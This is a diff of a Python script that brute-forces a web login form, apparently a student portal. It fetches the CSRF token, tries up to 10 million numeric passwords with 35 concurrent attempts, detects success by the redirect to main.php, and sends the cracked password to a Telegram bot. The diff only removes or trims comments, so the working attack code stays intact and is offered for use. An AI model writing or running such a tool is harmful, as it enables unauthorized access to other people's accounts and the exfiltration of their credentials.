@@ -7,23 +7,16 @@ from os import getenv
 load_dotenv()
 
 
-# ─────────────────────────────────────────────
-#  CONFIG — fill these in or set as env vars
-# ─────────────────────────────────────────────
 STUDENT_ID = getenv("USR")
 PASSWORD   = ""
 TELEGRAM_TOKEN   =  getenv("TELEGRAM_TOKEN")
 TELEGRAM_CHAT_ID = getenv("TELEGRAM_CHAT_ID")
 
-# ─────────────────────────────────────────────
-#  URLS
-# ─────────────────────────────────────────────
 BASE_URL  = getenv("URL")
 LOGIN_URL = f"{BASE_URL}/"
 HOME_URL  = f"{BASE_URL}/views/main.php"
 
-# --- CONFIG ---
-CONCURRENT_LIMIT = 35  # How many logins to try at the exact same time
+CONCURRENT_LIMIT = 35  
 TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
 
 async def notify(session, message: str):
@@ -37,12 +30,12 @@ async def attempt_login(session, PASSWORD, semaphore, stop_event):
     if stop_event.is_set():
         return
 
-    async with semaphore:  # Limits concurrency so you don't overwhelm your PC/Network
+    async with semaphore:  # Limits to prevent overwhelming
         try:
-            # Step 1: Get Login Page & CSRF
+            # Get Login Page & CSRF
             async with session.get(LOGIN_URL, timeout=10) as resp:
                 html = await resp.text()
-                soup = BeautifulSoup(html, "lxml") # Use 'lxml' for speed!
+                soup = BeautifulSoup(html, "lxml")
                 
                 form = soup.find("form")
                 payload = {inp.get("name"): inp.get("value", "") 
@@ -56,16 +49,15 @@ async def attempt_login(session, PASSWORD, semaphore, stop_event):
                         payload[key] = PASSWORD
                 
 
-            # Step 2: Post Login
+            # Post Login
             async with session.post(LOGIN_URL, data=payload, timeout=10) as resp:
-                # We check the final URL after redirects
-                # Step 3: Check Home Page
+                # Check Home Page
                 async with session.get(HOME_URL, timeout=10) as home_resp:
                     final_url = str(home_resp.url)
                     if HOME_URL in final_url or "main.php" in final_url:
                         print(f"Success found! {PASSWORD}")
                         await notify(session, f"{STUDENT_ID}: {PASSWORD}")
-                        stop_event.set() # Tells all other workers to stop
+                        stop_event.set()
                         return True
         except Exception:
             pass
@@ -81,7 +73,6 @@ async def run_async_loop(start_val, end_val):
         "Connection": "keep-alive"
     }
 
-    # Connector limits total open sockets to prevent OS 'Too many open files' error
     connector = aiohttp.TCPConnector(limit=CONCURRENT_LIMIT, ttl_dns_cache=300)
     
     async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
@@ -94,7 +85,7 @@ async def run_async_loop(start_val, end_val):
             task = asyncio.create_task(attempt_login(session, PASSWORD, semaphore, stop_event))
             tasks.append(task)
             
-            # CRITICAL: Clean up memory every 200 tasks
+            # Clean up memory every 200 tasks
             if i % 200 == 0:
                 await asyncio.sleep(0) # Let the event loop breathe
                 tasks = [t for t in tasks if not t.done()]
@@ -107,7 +98,6 @@ def core_entry_point(start, end):
 
 if __name__ == "__main__":
     total_range = 10_000_000
-    # Split the 10M work into 2 chunks for your 2 CPU cores
     mid_point = total_range // 2
     work_chunks = [(0, mid_point), (mid_point, total_range)]
 
